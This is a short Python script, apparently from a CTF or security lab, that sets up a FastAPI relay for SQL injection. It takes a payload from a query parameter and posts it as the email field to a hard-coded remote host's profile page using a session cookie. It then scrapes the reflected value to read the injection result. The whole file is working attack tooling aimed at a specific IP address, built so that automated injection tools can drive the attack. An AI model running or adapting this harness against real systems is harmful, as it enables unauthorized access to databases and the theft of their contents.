import uvicorn
from fastapi import FastAPI, Request, Response, status, UploadFile, Form, File, WebSocket
import requests
from bs4 import BeautifulSoup

app = FastAPI()
url = "http://159.89.161.185:5007"

# create route with payload parameter to send SQLi payload

COOKIE = "YOUR SESSION COOKIE"
@app.get("/")
async def root(payload: str):
   r = requests.post(url+"/profile", cookies = {"session": COOKIE}, data = {"username": "guesk", "password": "test", "email": payload})
   r = requests.get(url+"/profile", cookies = {"session": COOKIE})
   soup = BeautifulSoup(r.text, 'html.parser')
   print("Payload: " + payload)
   print("SQLi Result: " + soup.find("input", {"name": "email"})['placeholder'])
   return r.text

if __name__ == '__main__':
   uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=True)

